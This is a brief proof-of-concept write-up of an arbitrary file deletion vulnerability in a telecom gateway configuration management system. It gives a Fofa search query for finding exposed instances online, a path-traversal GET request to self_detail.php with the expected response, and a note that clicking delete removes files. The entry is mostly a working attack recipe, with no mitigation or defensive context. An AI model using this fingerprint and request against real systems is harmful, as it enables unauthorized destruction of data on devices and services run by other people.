### Telecom Gateway Configuration Management System Arbitrary File Deletion

**Fofa Query:** `body="img/dl.gif" && title="系统登录"`

**Vulnerability Description:** The telecom gateway configuration system suffers from an arbitrary file deletion vulnerability.

**Vulnerability POC (Proof of Concept):**

1. **Send a GET request to the following URL:**

   ```
   GET /newlive/manager/self_detail.php?dir=../../ HTTP/1.1
   ```

   **Response Code Characteristic:** 200  
   **Response Content Characteristic:** index.php

2. **Proceed with deletion:**

![image](https://github.com/user-attachments/assets/875434fe-8bef-42fa-bdca-8f02689244a3)


   Simply click the delete option to perform the file deletion.
